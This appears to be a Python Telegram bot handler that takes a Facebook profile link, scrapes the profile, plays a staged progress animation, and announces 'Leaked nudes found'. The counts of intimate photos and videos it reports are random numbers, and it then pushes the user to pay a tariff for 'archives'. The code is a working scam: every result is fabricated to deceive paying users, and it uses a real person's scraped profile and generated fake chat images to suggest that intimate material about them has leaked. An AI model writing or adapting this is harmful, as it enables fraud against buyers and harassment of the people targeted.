import time
from aiogram import Router
from aiogram.types import Message
from aiogram.filters import StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.enums.parse_mode import ParseMode
from utils.easy_func import EasyFunc
from generate_photos import facebook_photo_generate, fb_chats_generate
from states.states import AlSettings
from keyboards import KeyboardsCreate
from config_data.config import config_initial
import random
from get_data.facebook_scrap import main_scrape
import logging


router_facebook = Router()
logger_facebook_handler = logging.getLogger(__name__)

@router_facebook.message(StateFilter(AlSettings.facebook_link))
@EasyFunc.facebook_filter()
async def facebook_handler(message: Message, keyboards_instance: KeyboardsCreate,
                           config: config_initial, state: FSMContext):
    """Хэндлер колеса прогрузки после успешного получения ссылки"""
    try:
        await EasyFunc.delete_last_two_messages(message)
    except Exception:
        try:
            await message.delete()
        except Exception:
            logger_facebook_handler.info('Не удалось удалить сообщение')
    coincidences = random.randint(5, 25) #Совпадений найдено (случайно от 5 до 25)
    processed = random.randint(1496, 9999) #Проверено (случайно от 1496 до 9999)
    photo_file = None
    info_user = None
    media = None
    correspondence = random.randint(12, 20)
    intimate_photos = random.randint(20, 40)
    intimate_videos = random.randint(6, 10)
    gg = await message.answer(f'''⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️ 0%
Sending a request

They're looking for it now: 258''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️ 2%
Sending a request

They're looking for it now: 298''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️ 7%
connecting to the database

They're looking for it now: 298''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️ 14%
connecting to the database

They're looking for it now: 282''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️ 18%
Information search in this social network takes a bit longer time. Please be patient

They're looking for it now: 282''')
    time.sleep(2)
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩⬜⬜️⬜️⬜️⬜️⬜️⬜️ 25%
Looking for Coincidences

They're looking for it now: 233''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩⬜️⬜️⬜️⬜️⬜️⬜️ 37%
Connecting the AI

They're looking for it now: 240''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩🟩⬜️⬜️⬜️⬜️⬜️ 49%
Checking the Coincidences

They're looking for it now: 256''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩🟩⬜️⬜️⬜️⬜️⬜️ 57%
Connecting with MEGA

They're looking for it now: 283''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩🟩🟩⬜️⬜️⬜️⬜️ 66%
Connecting with MEGA

They're looking for it now: 283''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩🟩🟩🟩️⬜️⬜️⬜️ 74%
Connecting with facebook.com

They're looking for it now: 274''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩🟩🟩🟩️⬜️⬜️⬜️ 78%
Connecting with facebook.com

They're looking for it now: 274''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩🟩🟩🟩️🟩️⬜️⬜️ 85%
Looking deeper

They're looking for it now: 274''')
    time.sleep(3)
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩🟩🟩🟩️🟩️⬜️⬜️ 92%
Information search in this social network takes a bit longer time. Please be patient

They're looking for it now: 302''')
    try:
        info_user = main_scrape(message.text, config)
    except Exception:
        logging.info('Не удалось извлечь данные из фэйсбук')

    if info_user:
        try:
            list_images = await fb_chats_generate(info_user)
            media = await EasyFunc.media_images(list_images)
        except Exception:
            logging.info('Не удалось сгенерировать фотографию')

    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩🟩🟩🟩️🟩️🟩⬜️ 97%
Looking deeper

They're looking for it now: 305''')
    if info_user:
        try:
            #print(info_user)
            photo_file = await facebook_photo_generate(info_user, correspondence, intimate_photos, intimate_videos)
        except Exception:
            logging.info('Не удалось сгенерировать фотографию')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩🟩🟩🟩️🟩️🟩️🟩100%
We're finishing up

They're looking for it now: 305''')
    if photo_file:
        time.sleep(1)
        markdown_text = f"[{info_user['profile_name']}]({message.text})"
        await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id,
                                            text=f"✅ Leaked nudes found"
                                                 f"\n\n<b>{correspondence}</b> correspondence"
                                                 f"\n<b>{intimate_photos}</b> intimate photos"
                                                 f"\n<b>{intimate_videos}</b> intimate videos", parse_mode='HTML')
        await message.answer_photo(photo_file, caption=f"👤{markdown_text}", parse_mode=ParseMode.MARKDOWN)
        await message.bot.send_media_group(message.chat.id, media=media)
        await message.answer("The archives are formed. Choose a tariff and make a payment",
                             reply_markup=keyboards_instance.keyboard_payment)
        await state.set_state(AlSettings.to_pay)
    else:
        try:
            await message.bot.delete_message(chat_id=gg.chat.id, message_id=gg.message_id)
        except Exception:
            logger_facebook_handler.info('Не удалось удалить сообщение')
        await message.answer("Try a link to Facebook account")
        await state.set_state(AlSettings.facebook_link)
